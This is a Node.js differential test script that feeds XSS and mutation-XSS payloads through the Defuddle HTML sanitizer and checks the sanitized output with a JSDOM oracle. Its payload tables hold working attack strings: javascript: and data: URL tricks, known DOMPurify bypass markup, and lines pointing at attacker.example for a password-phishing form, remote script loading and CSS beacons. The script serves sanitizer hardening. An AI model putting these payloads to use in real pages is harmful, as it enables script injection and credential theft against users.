// Round-trip differential probe v2 for Defuddle 0.19.6 security sanitization.
// Offline: no network, no Jev API. Uses the built dist/ under linkedom and JSDOM,
// then re-parses every output with JSDOM (parse5, spec HTML5 parser) as the
// "consumer browser" oracle. Writes JSON next to this script.
import { createRequire } from 'node:module';
import { writeFileSync } from 'node:fs';
const require = createRequire('/home/alexi/git/defuddle/package.json');
const { Defuddle, DefuddleClass } = await import('/home/alexi/git/defuddle/dist/node.js');
const { parseLinkedomHTML } = await import('/home/alexi/git/defuddle/dist/utils/linkedom-compat.js');
const { createMarkdownContent } = await import('/home/alexi/git/defuddle/dist/markdown.js');
const { JSDOM } = require('jsdom');
const { marked } = require('marked');

const URL_ = 'https://example.com/page';
const FILLER = '<p>Lorem ipsum dolor sit amet consectetur adipiscing elit sed do eiusmod tempor incididunt ut labore et dolore magna aliqua ut enim ad minim veniam quis nostrud exercitation ullamco laboris.</p>';
const article = body => `<!DOCTYPE html><html><head><title>T</title></head><body><article><h1>T</h1>${FILLER}${body}${FILLER}${FILLER}</article></body></html>`;
const words = Array.from({ length: 40 }, (_, i) => `word${i}`).join(' ');
// JSON-LD body: must not contain "</script>" or it terminates the ld+json element.
const schemaPage = payload => {
  const ld = JSON.stringify({ '@context': 'https://schema.org', '@type': 'Article', headline: 'T', articleBody: `${payload} ${words}` }).replace(/<\//g, '<\\/');
  return `<!DOCTYPE html><html><head><title>T</title><script type="application/ld+json">${ld}</script></head><body><main><p>hi</p></main></body></html>`;
};

// Oracle: re-parse with a spec parser, report executable / dangerous constructs.
function oracle(html) {
  const dom = new JSDOM(`<!DOCTYPE html><body>${html}</body>`, { url: URL_ });
  const hits = [];
  for (const el of dom.window.document.body.querySelectorAll('*')) {
    const tag = el.tagName.toLowerCase();
    if (['script', 'style', 'template', 'object', 'embed', 'applet', 'base', 'meta', 'link', 'animate', 'set', 'animatemotion', 'animatetransform', 'frame', 'frameset'].includes(tag)) hits.push(`element:<${tag}>`);
    for (const a of Array.from(el.attributes)) {
      const n = a.name.toLowerCase();
      if (n.startsWith('on')) hits.push(`handler:${tag}@${n}`);
      if (n === 'srcdoc') hits.push(`srcdoc:${tag}`);
      if (['href', 'src', 'action', 'formaction', 'xlink:href', 'srcset', 'data-src', 'poster', 'ping', 'background', 'data'].includes(n)) {
        const v = a.value.replace(/[\s\u0000-\u001F]+/g, '').toLowerCase();
        if (v.includes('javascript:') || v.includes('vbscript:') || v.startsWith('blob:') || (v.startsWith('data:') && !v.startsWith('data:image/'))) hits.push(`url:${tag}@${n}=${a.value.slice(0, 70)}`);
      }
      if (n === 'style' && /url\(|position/i.test(a.value)) hits.push(`style:${tag}=${a.value.slice(0, 70)}`);
    }
  }
  return hits;
}
function mdOracle(md) {
  return oracle(marked.parse(md, { async: false }));
}

const results = [];
function record(group, name, impl, path, html, extra = {}) {
  const hits = oracle(html || '');
  results.push({ group, name, impl, path, hits, out: (html || '').slice(0, 400), ...extra });
  console.log(`[${group}] ${name} (${impl}, ${path}) -> ${hits.length ? hits.join(' | ') : 'clean'}`);
}
const docFor = (impl, html) => impl === 'jsdom' ? new JSDOM(html, { url: URL_ }).window.document : parseLinkedomHTML(html, URL_);

// ---------------------------------------------------------------------------
// GROUP A. strip-before-resolve ordering: quote-prefixed dangerous URLs.
// resolveRelativeUrls' resolve() strips a leading \" or quotes (defuddle.ts:1447-1450)
// AFTER stripUnsafeElements ran on _sanitizeExtractorHtml (1824 then 1825) and
// _serializeFallbackBody (325 then 326). Main pipeline resolves first (1071) then strips (1087).
// ---------------------------------------------------------------------------
const quotePayloads = {
  'a href dq-prefixed javascript': `<a href='"javascript:alert(1)'>click</a>`,
  'a href space+dq javascript': `<a href=' "javascript:alert(1)'>click</a>`,
  'a href backslash-dq javascript': `<a href='\\"javascript:alert(1)'>click</a>`,
  'a href sq-prefixed javascript': `<a href="'javascript:alert(1)">click</a>`,
  'a href triple-quote javascript': `<a href="'''javascript:alert(1)">click</a>`,
  'a href dq-prefixed data:text/html': `<a href='"data:text/html,<img src=x onerror=alert(1)>'>click</a>`,
  'iframe src dq-prefixed javascript': `<iframe src='"javascript:alert(1)'></iframe>`,
  'iframe src dq-prefixed data:text/html': `<iframe src='"data:text/html,<img src=x onerror=alert(1)>'></iframe>`,
  'iframe src dq-prefixed data:image/svg': `<iframe src='"data:image/svg+xml,<svg onload=alert(1)>'></iframe>`,
  'img src dq-prefixed javascript': `<img src='"javascript:alert(1)'>`,
  'form action dq-prefixed javascript': `<form action='"javascript:alert(1)'><button>go</button></form>`,
  'svg a xlink:href dq-prefixed javascript': `<svg><a xlink:href='"javascript:alert(1)'><text>x</text></a></svg>`,
  'control: plain javascript': `<a href="javascript:alert(1)">click</a>`,
  'control: dq-prefixed relative': `<a href='"/relative'>click</a>`,
};
for (const [name, payload] of Object.entries(quotePayloads)) {
  for (const impl of ['linkedom', 'jsdom']) {
    // A1. _sanitizeExtractorHtml directly (extractor output boundary + schema text fallback use it)
    const d1 = new DefuddleClass(docFor(impl, '<!DOCTYPE html><html><head><title>T</title></head><body><p>x</p></body></html>'), { url: URL_ });
    record('A1 _sanitizeExtractorHtml', name, impl, 'extractor-sanitize', d1._sanitizeExtractorHtml(payload));
    // A2. _serializeFallbackBody directly (body fallback / error path)
    const d2 = new DefuddleClass(docFor(impl, `<!DOCTYPE html><html><head><title>T</title></head><body>${payload}</body></html>`), { url: URL_ });
    record('A2 _serializeFallbackBody', name, impl, 'body-fallback', d2._serializeFallbackBody());
    // A3. schema.org articleBody text fallback, end to end through the public API
    const r3 = await Defuddle(docFor(impl, schemaPage(payload)), URL_, {});
    record('A3 schema-text fallback e2e', name, impl, 'schema-fallback', r3.content, { wordCount: r3.wordCount });
    // A4. main pipeline control (resolve before strip)
    const r4 = await Defuddle(docFor(impl, article(payload)), URL_, { standardize: false });
    record('A4 main pipeline (control)', name, impl, 'main', r4.content);
  }
  // A5. Does the Markdown layer carry it? (schema fallback + markdown:true; and createMarkdownContent on the leaked HTML)
  const r5 = await Defuddle(parseLinkedomHTML(schemaPage(payload), URL_), URL_, { markdown: true });
  const md5hits = mdOracle(r5.content);
  results.push({ group: 'A5 markdown after schema fallback', name, impl: 'linkedom', path: 'schema-fallback+markdown', hits: md5hits, out: r5.content.slice(0, 300) });
  console.log(`[A5 markdown after schema fallback] ${name} -> ${md5hits.length ? md5hits.join(' | ') : 'clean'}`);
}

// A6. Real extractor end to end: X article body link and header image (x-article extractor).
{
  const X_URL = 'https://x.com/testuser/article/123456789';
  const xPage = (headerImgAttrs, bodyExtra) => `<html><head><title>Test Article</title></head><body>
    <div data-testid="twitterArticleReadView">
      <div data-testid="tweetPhoto"><img ${headerImgAttrs}></div>
      <div data-testid="twitterArticleRichTextView">
        <h1 data-testid="twitter-article-title">Test Article</h1>
        <div class="public-DraftStyleDefault-block">Body text ${bodyExtra}</div>
      </div>
    </div></body></html>`;
  for (const impl of ['linkedom', 'jsdom']) {
    const r = await Defuddle(docFor(impl, xPage(`src='"javascript:alert(1)' alt="ok"`, `<a href='"javascript:alert(2)'>link</a>`)), X_URL, {});
    record('A6 x-article extractor e2e', 'header img src + body link dq-prefixed javascript', impl, 'extractor', r.content, { extractorType: r.extractorType });
  }
}

// ---------------------------------------------------------------------------
// GROUP B. Parser-differential / mXSS payloads not covered by probe.mjs.
// ---------------------------------------------------------------------------
const NOSTD = { standardize: false };
const NOREMOVE = { standardize: false, removeExactSelectors: false, removePartialSelectors: false, removeLowScoring: false, removeContentPatterns: false, removeHiddenElements: false, removeSmallImages: false };
const mxss = {
  'DOMPurify-2.0.17 mglyph/style': `<form><math><mtext></form><form><mglyph><style></math><img src=x onerror=alert(1)>`,
  'mtext/table/mglyph/style': `<math><mtext><table><mglyph><style><img src=x onerror=alert(1)>`,
  'svg p style': `<svg><p><style><img src=x onerror=alert(1)></style></p></svg>`,
  'svg desc img': `<svg><desc><img src=x onerror=alert(1)></desc></svg>`,
  'select iframe': `<select><iframe></select><img src=x onerror=alert(1)>`,
  'svg CDATA breakout': `<svg><![CDATA[</svg><img src=x onerror=alert(1)>]]></svg>`,
  'annotation-xml text/html': `<math><annotation-xml encoding="text/html"><img src=x onerror=alert(1)></annotation-xml></math>`,
  'svg style CDATA': `<svg><style><![CDATA[</style><img src=x onerror=alert(1)>]]></style></svg>`,
  'attr id tag breakout': `<p id="</p><img src=x onerror=alert(1)>">x</p>`,
  'hex entity javascript': `<a href="&#x6A;&#x61;vascript:alert(1)">x</a>`,
  'tab entity javascript': `<a href="jav&#x09;ascript:alert(1)">x</a>`,
  'leading ctrl entity javascript': `<a href="&#14; javascript:alert(1)">x</a>`,
  'colon hex entity javascript': `<a href="javascript&#x3A;alert(1)">x</a>`,
  'U+2028 javascript': `<a href="\u2028javascript:alert(1)">x</a>`,
  'U+200B javascript': `<a href="\u200Bjavascript:alert(1)">x</a>`,
  'javascript double slash newline': `<a href="javascript://%0aalert(1)">x</a>`,
  'mixed case scheme': `<a href="JaVaScRiPt:alert(1)">x</a>`,
  'iframe javascript src': `<iframe src="javascript:alert(1)"></iframe>`,
  'iframe data b64': `<iframe src="data:text/html;base64,PHNjcmlwdD5hbGVydCgxKTwvc2NyaXB0Pg=="></iframe>`,
  'details ontoggle': `<details open ontoggle="alert(1)">x</details>`,
  'marquee onstart': `<marquee onstart="alert(1)">x</marquee>`,
  'input image src javascript': `<input type="image" src="javascript:alert(1)">`,
  'svg image href javascript': `<svg><image href="javascript:alert(1)"/></svg>`,
  'svg feImage data svg': `<svg><filter id="f"><feImage href="data:image/svg+xml,<svg onload=alert(1)>"/></filter></svg>`,
  'body background javascript': `<table background="javascript:alert(1)"><tr><td>x</td></tr></table>`,
  'a download javascript': `<a href="javascript:alert(1)" download>x</a>`,
  'math maction statusline': `<math><maction actiontype="statusline#javascript:alert(1)"><mi>x</mi></maction></math>`,
  'xmp img (html context)': `<xmp><img src=x onerror=alert(1)></xmp>`,
  'noembed img (html context)': `<noembed><img src=x onerror=alert(1)></noembed>`,
  'iframe text child (html context)': `<iframe><img src=x onerror=alert(1)></iframe>`,
  'textarea img (html context)': `<textarea><img src=x onerror=alert(1)></textarea>`,
  'title in body': `<title><img src=x onerror=alert(1)></title>`,
  'nested a javascript': `<a href="#"><p><a href="javascript:alert(1)">x</a></p></a>`,
  'comment smuggle': `<!--<img src=x onerror=alert(1)>-->`,
  'link import': `<link rel="import" href="https://attacker.example/x.html">`,
  'link preload script': `<link rel="preload" as="script" href="https://attacker.example/x.js">`,
  'base href': `<base href="https://attacker.example/">`,
  'object data javascript': `<object data="javascript:alert(1)"></object>`,
  'embed src': `<embed src="https://attacker.example/x.swf">`,
  'svg script href': `<svg><script href="https://attacker.example/x.js"></script></svg>`,
  'svg handler': `<svg><circle r="10" onclick="alert(1)"/></svg>`,
  'svg a href javascript (plain)': `<svg><a href="javascript:alert(1)"><text>x</text></a></svg>`,
  'svg use href data svg': `<svg><use href="data:image/svg+xml;base64,PHN2ZyBpZD0neCc+PGEgeGxpbms6aHJlZj0namF2YXNjcmlwdDphbGVydCgxKSc+PHRleHQ+eDwvdGV4dD48L2E+PC9zdmc+#x"/></svg>`,
  'a href data image svg': `<a href="data:image/svg+xml,<svg onload=alert(1)>">x</a>`,
  'form phishing https action': `<form action="https://attacker.example/phish" method="post"><input name="password" type="password"><button>Login</button></form>`,
  'iframe allow camera': `<iframe src="https://attacker.example/embed" allow="camera *; microphone *; geolocation *"></iframe>`,
  'tailwind arbitrary style injection (svg)': `<svg viewBox="0 0 200 200" width="200" height="200"><rect class="text-[12px;background:url(https://attacker.example/t)]" width="200" height="200"/></svg>`,
  'svg style attr url()': `<svg viewBox="0 0 200 200" width="200" height="200"><rect style="fill:url(https://attacker.example/t)" width="200" height="200"/></svg>`,
};
for (const [name, payload] of Object.entries(mxss)) {
  for (const [optName, opts] of [['default', {}], ['nostd', NOSTD], ['noremove', NOREMOVE]]) {
    for (const impl of ['linkedom', 'jsdom']) {
      let html = '';
      try { html = (await Defuddle(docFor(impl, article(payload)), URL_, opts)).content; } catch (e) { html = `THREW: ${e.message}`; }
      record('B mXSS/encoding', `${name} [${optName}]`, impl, 'main', html);
    }
  }
}

// ---------------------------------------------------------------------------
// GROUP C. Markdown layer: style on complex tables, and direct createMarkdownContent.
// ---------------------------------------------------------------------------
{
  const table = `<table><tr><td colspan="2" style="position:fixed;top:0;left:0;width:100vw;height:100vh;background:url(https://attacker.example/t)">x</td><td>y</td></tr><tr><td>A</td><td>B</td><td>C</td></tr></table>`;
  for (const [optName, opts] of [['default', { markdown: true }], ['nostd', { markdown: true, standardize: false }]]) {
    const r = await Defuddle(parseLinkedomHTML(article(table), URL_), URL_, opts);
    const hits = mdOracle(r.content);
    results.push({ group: 'C markdown table style', name: `td style [${optName}]`, impl: 'linkedom', path: 'markdown', hits, out: r.content.slice(0, 400) });
    console.log(`[C markdown table style] td style [${optName}] -> ${hits.length ? hits.join(' | ') : 'clean'}`);
  }
  const direct = createMarkdownContent(table, URL_);
  const hits = mdOracle(direct);
  results.push({ group: 'C markdown table style', name: 'td style [createMarkdownContent direct]', impl: 'linkedom', path: 'markdown-direct', hits, out: direct.slice(0, 400) });
  console.log(`[C markdown table style] td style [createMarkdownContent direct] -> ${hits.length ? hits.join(' | ') : 'clean'}`);
  // Direct conversion with the quote-prefixed payload (GHSA-6frv path): does the markdown layer alone catch it?
  for (const [name, payload] of Object.entries(quotePayloads)) {
    const md = createMarkdownContent(`<p>Text</p>${payload}<p>More</p>`, URL_);
    const h = mdOracle(md);
    results.push({ group: 'C createMarkdownContent direct', name, impl: 'linkedom', path: 'markdown-direct', hits: h, out: md.slice(0, 300) });
    console.log(`[C createMarkdownContent direct] ${name} -> ${h.length ? h.join(' | ') : 'clean'}`);
  }
}

writeFileSync('/home/alexi/git/defuddle/experiments/jev/research/results/security-map/roundtrip-v2-results.json', JSON.stringify(results, null, 2));
const byGroup = {};
for (const r of results) { byGroup[r.group] ??= { n: 0, hits: 0 }; byGroup[r.group].n++; if (r.hits.length) byGroup[r.group].hits++; }
console.log('\nSUMMARY by group (probes / with oracle hits):');
for (const [g, v] of Object.entries(byGroup)) console.log(`  ${g.padEnd(40)} ${v.n} / ${v.hits}`);
